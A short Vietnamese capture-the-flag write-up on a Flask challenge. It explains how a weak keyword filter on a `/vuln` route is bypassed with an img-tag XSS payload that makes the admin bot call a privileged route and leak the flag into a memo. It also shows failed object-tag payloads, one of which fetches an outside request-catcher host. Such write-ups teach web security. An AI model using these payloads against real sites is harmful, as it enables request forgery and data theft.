Đọc source code thì thấy ở route `vuln` có thể khai thác xss
```python
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "").lower()
    xss_filter = ["frame", "script", "on"]
    for _ in xss_filter:
        param = param.replace(_, "*")
    return param
```
Code replace các string "frame", "script", "on" thành "*" mình đã thử dùng thẻ object mà không hiểu tại sao lại không hoạt động

```
<object data="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+"></object>
<object/data="jav&#x61;sc&#x72;ipt&#x3a;fetch('http://pmruqjmg.requestrepo.com')">
```
Sau khi đọc source một hồi mình thấy có manh mối ở route `/admin/notice_flag` 
```python
@app.route("/admin/notice_flag")
def admin_notice_flag():
    global memo_text
    if request.remote_addr != "127.0.0.1":
        return "Access Denied"
    if request.args.get("userid", "") != "admin":
        return "Access Denied 2"
    memo_text += f"[Notice] flag is {FLAG}\n"
    return "Ok"
```
Trong route này nếu có ip `127.0.0.1` request tới với param `userid=admin` thì sẽ ghép flag vào biến `memo_text` (được khai báo global). Mà biến này thì có thể lấy thông tin thông qua route `/memo`
```python
@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", None)
    if text:
        memo_text += text
    return render_template("memo.jinja2", memo=memo_text)
```
Việc cần làm bây giờ lại tạo payload xss trên route `/vuln` để bot truy cập vào route `/admin/notice_flag`. Ở đây mình sử dụng thẻ img với payload 
```
http://103.97.125.56:30458/vuln?param=%3Cimg%20src=%22/admin/notice_flag?userid=admin%22%3E
```
Sau khi gửi payload cho bot trong `/flag` thì vào `memo` để lấy flag thôi.
